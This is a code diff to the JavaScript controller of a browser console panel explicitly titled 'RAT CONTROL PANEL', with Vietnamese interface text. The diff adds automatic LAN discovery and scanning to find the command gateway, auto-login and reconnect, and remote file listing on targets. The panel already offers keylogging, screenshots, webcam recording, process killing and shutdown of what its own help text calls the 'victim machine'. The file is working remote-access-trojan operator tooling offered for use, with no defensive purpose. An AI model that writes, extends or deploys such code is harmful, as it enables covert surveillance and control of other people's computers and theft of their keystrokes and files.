@@ -1,5 +1,7 @@
 import { CONFIG } from './modules/config.js';
 import { Gateway } from './modules/gateway.js';
+import { GatewayDiscovery } from './modules/discovery.js';
+import { LanScanner } from './modules/scanner.js';
 
 const appState = {
     isConnected: false,
@@ -22,21 +24,72 @@ const ui = {
         console.group(`=== ${title} ===`);
         console.table(data);
         console.groupEnd();
+    },
+    renderFileList: (path, files, count) => {
+        console.group(`%c=== FILE LIST: ${path} (${count} items) ===`, 'color: #3b82f6; font-weight: bold;');
+        if (files && files.length > 0) {
+            console.table(files.map(f => ({
+                Name: f.name,
+                Type: f.type,
+                Size: f.size > 0 ? `${(f.size / 1024).toFixed(2)} KB` : '-',
+                Modified: f.modified || '-',
+                Permissions: f.permissions || '-',
+                'Is Dir': f.isDirectory ? '📁' : '📄'
+            })));
+            
+            console.log('%cNavigation:', 'color: #22c55e; font-weight: bold;');
+            console.log('  - listFiles("path/to/folder") - List files in folder');
+            console.log('  - listFiles("..") - Go to parent directory');
+            console.log('  - Click on directory name to navigate');
+        } else {
+            console.log('%cEmpty directory or access denied', 'color: #ef4444;');
+        }
+        console.groupEnd();
     }
+};
+
+let autoConnectState = {
+    hasTriedDiscovery: false,
+    isConnecting: false
 };
 
 const gateway = new Gateway({
     onConnected: () => {
-        ui.log("System", "Đã kết nối tới Gateway! Vui lòng gọi `auth()` để đăng nhập.");
+        ui.log("System", "Đã kết nối tới Gateway! Đang đăng nhập tự động...");
         appState.isConnected = true;
+        autoConnectState.isConnecting = false;
+        autoConnectState.hasTriedDiscovery = false; // Reset discovery flag on successful connection
+        if (gateway.ws && gateway.ws.url) {
+            const url = new URL(gateway.ws.url);
+            appState.lastConnectedHost = url.hostname;
+        }
+        console.log(`[Auto] Connection established, stopping any ongoing discovery...`);
+        setTimeout(() => {
+            gateway.authenticate();
+        }, 100);
     },
     onDisconnected: () => {
         ui.warn("System", "Mất kết nối Gateway.");
         appState.isConnected = false;
         appState.agents = [];
+        autoConnectState.isConnecting = false;
+        autoConnectState.hasTriedDiscovery = false;
+        
+        // Only auto-reconnect if we were actually connected
+        // Don't reconnect if connection was intentionally closed (code 1001/1000)
+        console.log(`[Auto] Connection lost, will attempt reconnect in 3 seconds...`);
+        setTimeout(() => {
+            if (!appState.isConnected && !autoConnectState.isConnecting) {
+                console.log(`[Auto] Attempting auto-reconnect...`);
+                autoConnect();
+            }
+        }, 3000);
     },
     onAuthSuccess: () => {
          ui.log("System", "Đăng nhập thành công! Đang tải danh sách Agent...");
+         setTimeout(() => {
+             gateway.refreshAgents();
+         }, 500);
     },
     onAgentListUpdate: (agentList) => {
         ui.log("System", `Cập nhật danh sách Agent: ${agentList.length} thiết bị.`);
@@ -84,17 +137,18 @@ const gateway = new Gateway({
     }
 });
 
-window.ui = ui; 
+window.ui = ui;
+window.gateway = gateway; 
 
 window.help = () => {
     console.clear();
     console.log("%c=== RAT CONTROL PANEL - HƯỚNG DẪN ===", "color: #fff; background: #8b5cf6; font-size: 16px; padding: 10px; border-radius: 5px; width: 100%; display: block;");
     
     console.group("%c1. KẾT NỐI & QUẢN LÝ", "color: #3b82f6");
-    //console.log("connect(ip)       - Kết nối tới server (VD: connect('localhost'))");
     console.log("getAgentList()    - fetch agent list")
     console.log("auth()            - Đăng nhập (Bắt buộc sau khi connect)");
-    console.log("scan()            - Quét mạng LAN tìm IP Server");
+    console.log("discover()        - Tự động tìm Gateway qua mDNS/Bonjour (rat-gateway.local)");
+    console.log("scan()            - Quét mạng LAN tìm IP Server (TCP scan)");
     console.log("setTarget('ID')   - Chọn mục tiêu cụ thể (hoặc 'ALL')");
     console.log("whoami()          - Lấy tên máy của mục tiêu");
     console.groupEnd();
@@ -115,17 +169,65 @@ window.help = () => {
     console.log("stopProc(id)      - Kill process theo PID");
     console.groupEnd();
 
-    console.group("%c4. KHÁC", "color: #eab308");
+    console.group("%c4. FILE SYSTEM", "color: #f59e0b");
+    console.log("listFiles(path)   - List files trong thư mục (VD: listFiles('C:\\\\') hoặc listFiles('/home'))");
+    console.log("listFiles()       - List files thư mục hiện tại (mặc định)");
+    console.groupEnd();
+
+    console.group("%c5. KHÁC", "color: #eab308");
     console.log("echo('msg')       - Gửi tin nhắn test (hiện popup/log bên agent)");
     console.log("shutdownAgent()   - Tắt máy nạn nhân");
     console.log("restartAgent()   - Tắt máy nạn nhân");
     console.log("help()            - Xem lại bảng này");
+    console.log("demoFileList()    - Demo file list commands");
     console.groupEnd();
     
     return "Hãy bắt đầu bằng lệnh: connect('localhost')";
 };
 
-gateway.connect('10.148.31.96');
+async function autoConnect() {
+    if (autoConnectState.isConnecting || appState.isConnected) {
+        return;
+    }
+    
+    autoConnectState.isConnecting = true;
+    ui.info("[Auto] Đang tự động tìm Gateway trên mạng LAN (Discovery)...");
+    
+    try {
+        let found = false;
+        const discoveryPromise = discovery.discover((ip, port) => {
+            found = true;
+            console.log(`[Auto] Discovery callback triggered: ip=${ip}, port=${port}`);
+            ui.log("Auto", `Tìm thấy Gateway trên LAN: ${ip}:${port}`);
+            console.log(`[Auto] Calling gateway.connect('${ip}', ${port})...`);
+            gateway.connect(ip, port);
+        }, (progress) => {
+            if (progress) {
+                ui.info(`[Auto] ${progress}`);
+            }
+        });
+        
+        const timeoutPromise = new Promise(resolve => setTimeout(() => resolve(false), 12000));
+        const result = await Promise.race([discoveryPromise, timeoutPromise]);
+        
+        if (found || result) {
+            return;
+        }
+        
+        ui.warn("Auto", "Không tìm thấy Gateway trên LAN. Đảm bảo Gateway đang chạy trên mạng.");
+        autoConnectState.hasTriedDiscovery = true;
+        autoConnectState.isConnecting = false;
+    } catch (error) {
+        ui.error("Auto", `Discovery error: ${error}`);
+        autoConnectState.hasTriedDiscovery = true;
+        autoConnectState.isConnecting = false;
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    window.help();
+    autoConnect();
+});
 
 window.getAgentList = () => {
     gateway.refreshAgents();
@@ -139,12 +241,32 @@ window.auth = () => {
     gateway.authenticate();
 };
 
+const scanner = new LanScanner();
+const discovery = new GatewayDiscovery();
+
 window.scan = () => {
     ui.info("[Main] Đang quét mạng (192.168.1.x)...");
     scanner.scan("192.168.1.", (foundIp) => {
         ui.log("Scanner", `Tìm thấy server tại: ${foundIp}`);
         gateway.connect(foundIp);
+        setTimeout(() => gateway.authenticate(), 500);
     });
+};
+
+window.discover = () => {
+    ui.info("[Discovery] Đang tìm Gateway trên mạng LAN...");
+    discovery.discover((ip, port) => {
+        ui.log("Discovery", `Tìm thấy Gateway tại: ${ip}:${port}`);
+        gateway.connect(ip, port);
+        setTimeout(() => gateway.authenticate(), 500);
+    }, (progress) => {
+        ui.info(`[Discovery] ${progress}`);
+    });
+};
+
+window.reconnect = () => {
+    ui.info("[Main] Đang kết nối lại...");
+    autoConnect();
 };
 
 window.setTarget = (agentId) => {
@@ -153,23 +275,27 @@ window.setTarget = (agentId) => {
     ui.info(`[Control] Đã khóa mục tiêu: ${agentId}`);
 }
 
-// App Control
 window.listApps = () => gateway.fetchAppList();
 window.startApp = (id) => gateway.startApp(id);
 window.stopApp = (id) => gateway.killApp(id);
 
-// Process Control
 window.listProcs = () => gateway.fetchProcessList();
 window.startProc = (id) => gateway.startProcess(id);
 window.stopProc = (id) => gateway.killProcess(id);
 
-// Spy
+window.listFiles = (path = "") => {
+    if (path === "") {
+        path = "/";
+    }
+    ui.info(`[CMD] Listing files in: ${path}`);
+    gateway.listFiles(path);
+};
+
 window.whoami = () => gateway.send(CONFIG.CMD.WHOAMI, "");
 window.echo = (text) => gateway.send(CONFIG.CMD.ECHO, text);
 window.screenshot = () => gateway.send(CONFIG.CMD.SCREENSHOT, "");
 window.recordCam = (duration = 5) => gateway.send(CONFIG.CMD.CAM_RECORD, String(duration));
 
-// Keylog
 window.startKeylog = () => {
     ui.info("[CMD] Bật Keylogger...");
     gateway.send(CONFIG.CMD.START_KEYLOG, JSON.stringify({interval: 0.5}));
@@ -179,7 +305,6 @@ window.stopKeylog = () => {
     gateway.send(CONFIG.CMD.STOP_KEYLOG, "");
 };
 
-// Power
 window.shutdownAgent = () => {
     if(confirm("CẢNH BÁO: Bạn chắc chắn muốn tắt máy mục tiêu?")) {
         gateway.send(CONFIG.CMD.SHUTDOWN, "");
@@ -192,6 +317,32 @@ window.restartAgent = () => {
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    window.help();
-});
+window.demoFileList = () => {
+    console.clear();
+    console.log("%c=== DEMO FILE LIST ===", "color: #fff; background: #8b5cf6; font-size: 16px; padding: 10px;");
+    console.log("%cTesting file list functionality...", "color: cyan;");
+    console.log("");
+    
+    console.log("%c1. List root directory:", "color: #3b82f6; font-weight: bold;");
+    console.log("   listFiles('/')");
+    console.log("");
+    
+    console.log("%c2. List Windows C: drive:", "color: #3b82f6; font-weight: bold;");
+    console.log("   listFiles('C:\\\\')");
+    console.log("");
+    
+    console.log("%c3. List home directory:", "color: #3b82f6; font-weight: bold;");
+    console.log("   listFiles('~') or listFiles(process.env.HOME)");
+    console.log("");
+    
+    console.log("%c4. Navigate to subfolder:", "color: #3b82f6; font-weight: bold;");
+    console.log("   listFiles('/home/username')");
+    console.log("   listFiles('C:\\\\Users\\\\Username')");
+    console.log("");
+    
+    console.log("%cNow try:", "color: #22c55e; font-weight: bold;");
+    console.log("   listFiles('/')");
+    console.log("");
+    
+    return "Demo ready! Try: listFiles('/')";
+}
